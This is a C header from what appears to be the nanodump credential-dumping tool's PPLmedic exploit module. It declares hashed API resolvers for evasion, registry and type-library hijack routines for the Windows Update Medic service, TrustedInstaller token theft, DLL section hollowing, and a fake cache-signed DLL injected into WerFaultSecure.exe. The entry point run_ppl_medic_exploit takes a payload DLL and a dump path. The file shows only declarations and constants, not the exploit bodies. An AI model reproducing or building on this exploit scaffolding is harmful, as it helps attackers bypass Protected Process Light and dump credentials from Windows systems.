#pragma once

#include "impersonate.h"
#include "token_priv.h"
#include "dinvoke.h"
#include "handle.h"

#define TH32CS_SNAPTHREAD 0x00000004

typedef struct tagTHREADENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ThreadID;
  DWORD th32OwnerProcessID;
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32, *LPTHREADENTRY32;

typedef struct _FILE_LIST {
  WCHAR FileName[MAX_PATH + 1];
  BOOL  Existed;
  struct _FILE_LIST* Next;
} FILE_LIST, *PFILE_LIST;

typedef ULONGLONG(WINAPI* GetTickCount64_t) ();
typedef SC_HANDLE(WINAPI* OpenSCManagerW_t)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
typedef SC_HANDLE(WINAPI* OpenServiceW_t)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
typedef BOOL(WINAPI* CloseServiceHandle_t)(SC_HANDLE hSCObject);
typedef HRESULT(WINAPI* LoadTypeLib_t)(LPCOLESTR szFile, ITypeLib **pptlib);
typedef HRESULT(WINAPI* CreateTypeLib2_t)(SYSKIND syskind, LPCOLESTR szFile, ICreateTypeLib2 **ppctlib);
typedef BSTR(WINAPI* SysAllocString_t)(const OLECHAR *psz);
typedef VOID(WINAPI* SysFreeString_t)(BSTR bstrString);
typedef HANDLE(WINAPI* CreateToolhelp32Snapshot_t)(DWORD dwFlags, DWORD th32ProcessID);
typedef BOOL(WINAPI* Thread32First_t)(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
typedef BOOL(WINAPI* Thread32Next_t)(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
typedef HANDLE(WINAPI* CreateFileTransactedW_t)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile, HANDLE hTransaction, PUSHORT pusMiniVersion, PVOID lpExtendedParameter);
typedef HANDLE(WINAPI* FindFirstFileW_t)(LPCWSTR lpFileName,LPWIN32_FIND_DATAW lpFindFileData);
typedef BOOL(WINAPI* FindNextFileW_t)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
typedef BOOL(WINAPI* FindClose_t)(HANDLE hFindFile);
typedef UINT(WINAPI* GetSystemDirectoryW_t)(LPWSTR lpBuffer, UINT uSize);
typedef UINT(WINAPI* GetWindowsDirectoryW_t)(LPWSTR lpBuffer, UINT uSize);
typedef DWORD(WINAPI* GetFileAttributesW_t)(LPCWSTR lpFileName);
typedef HANDLE(WINAPI* CreateEventW_t)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
typedef BOOL(WINAPI* DeleteFileW_t)(LPCWSTR lpFileName);
typedef BOOL(WINAPI* LockFile_t)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToLockLow, DWORD nNumberOfBytesToLockHigh);
typedef BOOL(WINAPI* UnlockFile_t)(HANDLE hFile, DWORD dwFileOffsetLow, DWORD dwFileOffsetHigh, DWORD nNumberOfBytesToUnlockLow, DWORD nNumberOfBytesToUnlockHigh);

#define GetTickCount64_SW2_HASH           0x5DA9A282
#define OpenSCManagerW_SW2_HASH           0x10B0D71C
#define OpenServiceW_SW2_HASH             0x29B5ED2E
#define CloseServiceHandle_SW2_HASH       0x2D916B4A
#define LoadTypeLib_SW2_HASH              0x689C94C2
#define CreateTypeLib2_SW2_HASH           0xE6DF4E21
#define SysAllocString_SW2_HASH           0x1819D63C
#define SysFreeString_SW2_HASH            0xFF68F5F9
#define CreateToolhelp32Snapshot_SW2_HASH 0x0E90CBC0
#define Thread32First_SW2_HASH            0x7C990674
#define Thread32Next_SW2_HASH             0x42ED312A
#define FindFirstFileW_SW2_HASH           0x8EDA41FA
#define FindNextFileW_SW2_HASH            0xBF0C31DB
#define FindClose_SW2_HASH                0xD2503ADD
#define CreateFileTransactedW_SW2_HASH    0x968D0D41
#define GetSystemDirectoryW_SW2_HASH      0x008D32E6
#define GetWindowsDirectoryW_SW2_HASH     0xE668D186
#define GetFileAttributesW_SW2_HASH       0x70EEEEDF
#define CreateEventW_SW2_HASH             0x1C8569AF
#define DeleteFileW_SW2_HASH              0x40DA6544
#define LockFile_SW2_HASH                 0x6D347D89
#define UnlockFile_SW2_HASH               0x3E214ABE

#define VERSION_MAJOR                           0                                       // Major version of the tool
#define VERSION_MINOR                           1                                       // Minor version of the tool
#define PAGE_SIZE                               0x1000                                  // Default size for memory allocations
#define LARGE_BUFFER_SIZE                       (256 * 1024 * 1024)                     // Default size for large memory allocations
#define TIMEOUT                                 5000                                    // Default timeout for wait operations
#define MAX_ATTEMPTS                            1000                                    // Default maximum number of attempts for the memory write exploit

#define SERVICES_ACTIVE_DATABASEA "ServicesActive"
#define SERVICES_ACTIVE_DATABASEW L"ServicesActive"


#define STR_KNOWNDLLS                           L"\\KnownDlls"                          // Path of the \KnownDlls object directory
#define STR_MOD_NTDLL                           L"ntdll"                                // Name of the 'ntdll.dll' module
#define STR_MOD_COMBASE                         L"combase"                              // Name of the 'combase.dll' module
#define STR_PROC_NTIMPERSONATETHREAD            "NtImpersonateThread"                   // Syscall for impersonating a thread's Token
#define STR_PROC_NTCREATESECTION                "NtCreateSection"                       // Syscall for creating a Section object
#define STR_PROC_LDRGETKNOWNDLLSECTIONHANDLE    "LdrGetKnownDllSectionHandle"           // Name of the global variable (in 'ntdll') that holds the value of the \KnownDlls directory
#define STR_TI_SVC                              L"TrustedInstaller"                     // Name of the TrustedInstaller identity
#define STR_WAASMEDIC_SVC                       L"WaaSMedicSvc"                         // Name of the Windows Update Medic service
#define STR_WAASMEDIC_CAPSULE                   L"WaaSMedicCapsule.dll"                 // Name of the Windows Update Medic service's capsule plugin module
#define STR_WAASMEDIC_TYPELIB                   L"WaaSMedicPS.dll"                      // Name of the Windows Update Medic service's Proxy/Stub module
#define STR_WAASMEDIC_TYPELIB_DEFAULT           L"%SystemRoot%\\system32\\WaaSMedicPS.dll" // Default path of the Windows Update Medic service's Proxy/Stub module
#define STR_TASKSCHD_TYPELIB_DEFAULT            L"TaskSchdPS.dll"                       // Name of the Task Scheduler's Proxy/Stub module
#define STR_METHOD_LAUNCHDETECTIONONLY          L"LaunchDetectionOnly"                  // Name of the WaaSRemediationAgent's fist method
#define STR_METHOD_LAUNCHREMEDIATIONONLY        L"LaunchRemediationOnly"                // Name of the WaaSRemediationAgent's second method
#define STR_BASENAMEDOBJECTS                    L"BaseNamedObjects"                     // Name of the \BaseNamedObjets object directory
#define STR_HIJACKED_DLL_NAME                   L"WaaSMedicPayload.dll"                 // Name of a non-existent module
#define STR_IPC_WAASMEDIC_LOAD_EVENT_NAME       L"WaaSMedicLoadEvent"                   // Name of an event used for synchronization between the tool and DLL injected in WaaSMedicSvc
#define STR_IPC_WERFAULT_LOAD_EVENT_NAME        L"WerFaultLoadEvent"                    // Name of an event used for synchronization between the tool and DLL injected in WerFaultSecure.exe
#define STR_IPC_PIPE_NAME                       L"PPLmedicPipe"                         // Name of the named pipe used to communicate with processes in which the payload DLL is injected
#define STR_DUMMY_PIPE_NAME                     L"WaaSMedicLogonSessionPipe"            // Name of the named pipe used to retrieve the initial logon session token of LOCAL SYSTEM
#define STR_SIGNED_SYSTEM_DLL                   L"dbghelp.dll"                          // Name of a legitimate system DLL used to create a fake cached signed DLL
#define STR_CACHE_SIGNED_DLL_NAME               L"faultrep.dll"                         // Name of a DLL to cache sign and hijack in a protected process
#define STR_SIGNED_EXE_NAME                     L"WerFaultSecure.exe"                   // Name of a signed executable we can start with the protection level WinTcb

#define STR_PROTECTION_LEVEL_WINTCB_LIGHT       L"PsProtectedSignerWinTcb-Light"        // PPL WinTcb
#define STR_PROTECTION_LEVEL_WINDOWS            L"PsProtectedSignerWindows"             // PP  Windows
#define STR_PROTECTION_LEVEL_WINDOWS_LIGHT      L"PsProtectedSignerWindows-Light"       // PPL Windows
#define STR_PROTECTION_LEVEL_ANTIMALWARE_LIGHT  L"PsProtectedSignerAntimalware-Light"   // PPL Antimalware
#define STR_PROTECTION_LEVEL_LSA_LIGHT          L"PsProtectedSignerLsa-Light"           // PPL Lsa
#define STR_PROTECTION_LEVEL_WINTCB             L"PsProtectedSignerWinTcb"              // PP  WinTcb
#define STR_PROTECTION_LEVEL_CODEGEN_LIGHT      L"PsProtectedSignerCodegen-Light"       // PPL Codegen
#define STR_PROTECTION_LEVEL_AUTHENTICODE       L"PsProtectedSignerAuthenticode"        // PP  Authenticode
#define STR_PROTECTION_LEVEL_PPL_APP            L"PsProtectedSignerApp-Light"           // PPL App
#define STR_PROTECTION_LEVEL_NONE               L"None"                                 // None

#define STR_SE_SIGNING_LEVEL_UNCHECKED          L"Unchecked"                            // 0x00000000
#define STR_SE_SIGNING_LEVEL_UNSIGNED           L"Unsigned"                             // 0x00000001
#define STR_SE_SIGNING_LEVEL_ENTERPRISE         L"Enterprise"                           // 0x00000002
#define STR_SE_SIGNING_LEVEL_DEVELOPER          L"Developer"                            // 0x00000003 (Custom1)
#define STR_SE_SIGNING_LEVEL_AUTHENTICODE       L"Authenticode"                         // 0x00000004
#define STR_SE_SIGNING_LEVEL_CUSTOM_2           L"Custom2"                              // 0x00000005
#define STR_SE_SIGNING_LEVEL_STORE              L"Store"                                // 0x00000006
#define STR_SE_SIGNING_LEVEL_ANTIMALWARE        L"Antimalware"                          // 0x00000007 (Custom3)
#define STR_SE_SIGNING_LEVEL_MICROSOFT          L"Microsoft"                            // 0x00000008
#define STR_SE_SIGNING_LEVEL_CUSTOM_4           L"Custom4"                              // 0x00000009
#define STR_SE_SIGNING_LEVEL_CUSTOM_5           L"Custom5"                              // 0x0000000A
#define STR_SE_SIGNING_LEVEL_DYNAMIC_CODEGEN    L"DynamicCodegen"                       // 0x0000000B
#define STR_SE_SIGNING_LEVEL_WINDOWS            L"Windows"                              // 0x0000000C
#define STR_SE_SIGNING_LEVEL_CUSTOM_7           L"Custom7"                              // 0x0000000D
#define STR_SE_SIGNING_LEVEL_WINDOWS_TCB        L"WindowsTcb"                           // 0x0000000E
#define STR_SE_SIGNING_LEVEL_CUSTOM_6           L"Custom6"                              // 0x0000000F
#define STR_SE_SIGNING_LEVEL_UNKNOWN            L"Unknown"

#define ITypeLib_GetLibAttr(This,ppTLibAttr) (This)->lpVtbl->GetLibAttr(This,ppTLibAttr)
#define ICreateTypeLib2_SetGuid(This,guid) (This)->lpVtbl->SetGuid(This,guid)
#define ICreateTypeLib2_SetLcid(This,lcid) ( (This)->lpVtbl->SetLcid(This,lcid) ) 
#define ICreateTypeLib2_SetVersion(This,wMajorVerNum,wMinorVerNum) ( (This)->lpVtbl->SetVersion(This,wMajorVerNum,wMinorVerNum) ) 
#define ITypeLib_GetTypeInfoOfGuid(This,guid,ppTinfo) ( (This)->lpVtbl->GetTypeInfoOfGuid(This,guid,ppTinfo) ) 
#define ITypeInfo_GetTypeAttr(This,ppTypeAttr) ( (This)->lpVtbl -> GetTypeAttr(This,ppTypeAttr) ) 
#define ITypeInfo_GetDocumentation(This,memid,pBstrName,pBstrDocString,pdwHelpContext,pBstrHelpFile) ( (This)->lpVtbl -> GetDocumentation(This,memid,pBstrName,pBstrDocString,pdwHelpContext,pBstrHelpFile) ) 
#define ICreateTypeLib2_CreateTypeInfo(This,szName,tkind,ppCTInfo) ( (This)->lpVtbl -> CreateTypeInfo(This,szName,tkind,ppCTInfo) ) 
#define ICreateTypeInfo_SetTypeFlags(This,uTypeFlags) ( (This)->lpVtbl -> SetTypeFlags(This,uTypeFlags) ) 
#define ICreateTypeInfo_SetGuid(This,guid) ( (This)->lpVtbl -> SetGuid(This,guid) ) 
#define ICreateTypeInfo_SetVersion(This,wMajorVerNum,wMinorVerNum) ( (This)->lpVtbl -> SetVersion(This,wMajorVerNum,wMinorVerNum) ) 
#define ITypeInfo_GetRefTypeOfImplType(This,index,pRefType) ( (This)->lpVtbl -> GetRefTypeOfImplType(This,index,pRefType) ) 
#define ITypeInfo_GetRefTypeInfo(This,hRefType,ppTInfo) ( (This)->lpVtbl -> GetRefTypeInfo(This,hRefType,ppTInfo) ) 
#define ICreateTypeInfo_AddRefTypeInfo(This,pTInfo,phRefType) ( (This)->lpVtbl -> AddRefTypeInfo(This,pTInfo,phRefType) ) 
#define ICreateTypeInfo_AddImplType(This,index,hRefType) ( (This)->lpVtbl -> AddImplType(This,index,hRefType) )
#define ITypeInfo_GetFuncDesc(This,index,ppFuncDesc) ( (This)->lpVtbl -> GetFuncDesc(This,index,ppFuncDesc) ) 
#define ITypeInfo_ReleaseFuncDesc(This,pFuncDesc) ( (This)->lpVtbl -> ReleaseFuncDesc(This,pFuncDesc) ) 
#define ITypeInfo_GetNames(This,memid,rgBstrNames,cMaxNames,pcNames) ( (This)->lpVtbl -> GetNames(This,memid,rgBstrNames,cMaxNames,pcNames) ) 
#define ICreateTypeInfo_AddFuncDesc(This,index,pFuncDesc) ( (This)->lpVtbl -> AddFuncDesc(This,index,pFuncDesc) ) 
#define ICreateTypeInfo_SetFuncAndParamNames(This,index,rgszNames,cNames) ( (This)->lpVtbl -> SetFuncAndParamNames(This,index,rgszNames,cNames) ) 
#define ITypeInfo_ReleaseTypeAttr(This,pTypeAttr) ( (This)->lpVtbl -> ReleaseTypeAttr(This,pTypeAttr) ) 
#define ICreateTypeLib2_SaveAllChanges(This) ( (This)->lpVtbl -> SaveAllChanges(This) ) 
#define ITypeLib_ReleaseTLibAttr(This,pTLibAttr) ( (This)->lpVtbl -> ReleaseTLibAttr(This,pTLibAttr) ) 

// WaaSRemediationAgent - 72566E27-1ABB-4EB3-B4F0-EB431CB1CB32
#define CLSID_WAASREMEDIATION   { 0x72566e27, 0x1abb, 0x4eb3, { 0xb4, 0xf0, 0xeb, 0x43, 0x1c, 0xb1, 0xcb, 0x32 } }
// IWaaSRemediationEx - B4C1D279-966E-44E9-A9C5-CCAF4A77023D
#define IID_WAASREMEDIATIONEX   { 0xb4c1d279, 0x966e, 0x44e9, { 0xa9, 0xc5, 0xcc, 0xaf, 0x4a, 0x77, 0x02, 0x3d } }
// ITaskHandler - 839D7762-5121-4009-9234-4F0D19394F04
#define IID_TASKHANDLER         { 0x839d7762, 0x5121, 0x4009, { 0x92, 0x34, 0x4f, 0x0d, 0x19, 0x39, 0x4f, 0x04 } }

#define NtGetCurrentProcess() ( ( HANDLE ) ( LONG_PTR ) - 1 )
#define NtGetCurrentThread() ( ( HANDLE ) ( LONG_PTR ) - 2 )

BOOL run_ppl_medic_exploit(
    IN unsigned char nanodump_ppl_medic_dll[],
    IN unsigned int nanodump_ppl_medic_dll_len,
    IN LPSTR dump_path,
    IN BOOL use_valid_sig,
    IN BOOL elevate_handle);

BOOL restart_waa_s_medic_svc();

BOOL find_waa_s_medic_svc_base_named_objects_handle();

BOOL find_saa_s_medic_svc_pid(
    IN LPDWORD Pid);

BOOL write_type_lib(
    IN LPWSTR TypeLibPath);

BOOL modify_type_lib_registry_value(
    IN LPWSTR TypeLibPath,
    IN LPWSTR TypeLibRegValuePath,
    IN HANDLE hTI,
    OUT PBOOL StateRegTypeLibModified);

BOOL get_type_lib_orig_path(
    IN LPWSTR TypeRegValuePath,
    OUT LPWSTR* TypeLibOrigPath);

BOOL get_trusted_installer_token(
    OUT PHANDLE hTI);

BOOL map_payload_dll(
    IN unsigned char nanodump_ppl_medic_dll[],
    IN unsigned int nanodump_ppl_medic_dll_len,
    IN LPWSTR HijackedDllName,
    IN LPWSTR HijackedDllSectionPath,
    OUT LPWSTR* HollowedDllPath,
    OUT PHANDLE DllSectionHandle);

BOOL get_proxy_stub_orig_path(
    IN LPWSTR ProxyStubRegValuePath,
    OUT LPWSTR* ProxyStubOrigPath);

BOOL create_dummy_dll_file(
    IN LPWSTR HijackedDllName,
    OUT PHANDLE DummyDllFileHandle);

BOOL find_proxy_stub_registry_value_path(
    OUT LPWSTR* ProxyStubRegistryValuePath);

BOOL modify_proxy_stub_registry_value(
    IN HANDLE hTI,
    IN LPWSTR ProxyStubRegValuePath,
    IN LPWSTR HijackedDllName,
    OUT PBOOL StateRegProxyStubModified);

BOOL get_waa_s_medic_capsule_path(
    IN LPWSTR* WaaSMedicCapsulePath);

BOOL lock_plugin_dll(
    IN LPWSTR WaaSMedicCapsulePath,
    IN OUT PBOOL StatePluginDllLocked,
    OUT PHANDLE WaaSMedicCapsuleHandle);

BOOL enumerate_temporary_directories(
    OUT PFILE_LIST* pfile_list);

BOOL is_proxy_stub_dll_loaded(
    IN HANDLE ProxyStubDllLoadEventHandle);

BOOL cleanup_temp_directories(
    IN PFILE_LIST TemporaryDiretoriesBefore,
    IN PFILE_LIST TemporaryDiretoriesAfter);

VOID free_directory_list(
    IN PFILE_LIST head);

BOOL unlock_plugin_dll(
    IN HANDLE WaaSMedicCapsuleHandle);

BOOL delete_type_lib(
    IN LPWSTR TypeLibPath);

BOOL create_load_event(
    IN LPWSTR event_name,
    OUT PHANDLE ProxyStubDllLoadEventHandle);
